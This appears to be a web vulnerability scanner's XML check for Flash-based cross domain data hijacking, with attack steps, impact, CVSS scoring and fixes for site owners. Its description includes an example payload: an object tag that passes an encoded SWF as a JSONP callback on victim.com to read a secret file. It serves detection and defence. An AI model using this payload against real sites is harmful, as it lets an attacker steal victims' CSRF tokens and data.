<?xml version="1.0" standalone="no"?>
<WebApplicationTest>
	<TestDescription name="Cross domain data hijacking" version="0.1" released="20080307" updated="20140522" protocol="FTP" mayproxy="false" affects="server" severity="medium" alert="success" type="Configuration">
		<WASPDescription BindAlertToFile="0" CrawlerProcessingMode="ParseOnly" TargetFormat="" Target="" ModuleName="" Request="" Response="" FullResponse="" DetailsFormat="" Details="" AuthType="0" AuthName="" AuthPass="" CompInfo="" DetaliedInformation="" AlertTags="configuration" CVE="" CWE="CWE-20" CVSSVer="2.0" CVSSScore="4.4" CVSSDescr="AV:N/AC:M/Au:N/C:N/I:P/A:N" CVSSScoreTemp="4.5" CVSSScoreEnv="4.3"/>
		<Copyright></Copyright>
		<Description>This page is possibly vulnerable to Cross domain data hijacking. If an attacker can create/upload a malicious Flash (SWF) file or control the top part of any page he can perform an attack known as [bold]Cross domain data hijacking[/bold]. The Content-Type of the response doesn't matter. If the file is embedded using an &lt;object&gt; tag, it will be executed as a Flash file as long as the content of the file looks like a valid Flash file. 
[p] Here is the attack scenario:
[ul]
[li]An attacker creates a malicious Flash (SWF) file[/li]
[li]The attacker changes the file extension to JPG[/li]
[li]The attacker uploads the file to victim.com[/li]
[li]The attacker embeds the file on attacker.com using an tag with type "application/x-shockwave-flash"[/li]
[li]The victim visits attacker.com, loads the file as embedded with the tag[/li]
[li]The attacker can now send and receive arbitrary requests to victim.com using the victims session[/li]
[li]The attacker sends a request to victim.com and extracts the CSRF token from the response[/li]
[/ul]
[/p]

[p]
There are many ways to perform this attack. The attacker doesn't need to upload a file. The only requirement is that an attacker can control the data on a location of the target domain. One way is to abuse a JSONP API. Usually, the attacker can control the output of a JSONP API endpoint by changing the callback parameter. However, if an attacker uses an entire Flash file as callback, we can use it just like we would use an uploaded file in this attack. [/p]

A payload could look like this:
[pre]
&lt;object style="height:1px;width:1px;" data="http://victim.com/user/jsonp?callback=CWS%07%0E000x%9C%3D%8D1N%C3%40%10E%DF%AE%8D%BDI%08%29%D3%40%1D%A0%A2%05%09%11%89HiP%22%05D%8BF%8E%0BG%26%1B%D9%8E%117%A0%A2%DC%82%8A%1Br%04X%3B%21S%8C%FE%CC%9B%F9%FF%AA%CB7Jq%AF%7F%ED%F2%2E%F8%01%3E%9E%18p%C9c%9Al%8B%ACzG%F2%DC%BEM%EC%ABdkj%1E%AC%2C%9F%A5%28%B1%EB%89T%C2Jj%29%93%22%DBT7%24%9C%8FH%CBD6%29%A3%0Bx%29%AC%AD%D8%92%FB%1F%5C%07C%AC%7C%80Q%A7Nc%F4b%E8%FA%98%20b%5F%26%1C%9F5%20h%F1%D1g%0F%14%C1%0A%5Ds%8D%8B0Q%A8L%3C%9B6%D4L%BD%5F%A8w%7E%9D%5B%17%F3%2F%5B%DCm%7B%EF%CB%EF%E6%8D%3An%2D%FB%B3%C3%DD%2E%E3d1d%EC%C7%3F6%CD0%09" type="application/x-shockwave-flash" allowscriptaccess="always" flashvars="c=alert&amp;u=http://victim.com/secret_file.txt"&gt;&lt;/object&gt;
[/pre]</Description>
		<ApplicableTo>
			<Platform>
				<OS>*</OS>
				<Arch>*</Arch>
			</Platform>
			<WebServer>*</WebServer>
			<ApplicationServer>*</ApplicationServer>
		</ApplicableTo>
		<Impact>An attacker can read any secrets (such as CSRF tokens) from the affected domain.</Impact>
		<Recommendation>For file uploads: It is recommended to check the file's content to have the correct header and format. If possible, use "Content-Disposition: attachment; filename=Filename.Extension;" header for the files that do not need to be served in the web browser. Isolating the domain of the uploaded files is also a good solution as long as the crossdomain.xml file of the main website does not include the isolated domain. [break][break]

For other cases: For JSONP abuses or other cases when the attacker control the top part of the page, you need to perform proper input filtering to protect against this type of issues.</Recommendation>
		<Reference database="Cross Domain Data Hijacking " URL="https://soroush.secproject.com/blog/2014/05/even-uploading-a-jpg-file-can-lead-to-cross-domain-data-hijacking-client-side-attack/"/><Reference database="The pitfalls of allowing file uploads on your website" URL="http://blog.detectify.com/post/86298380233/the-pitfalls-of-allowing-file-uploads-on-your-website"/></TestDescription>
</WebApplicationTest>
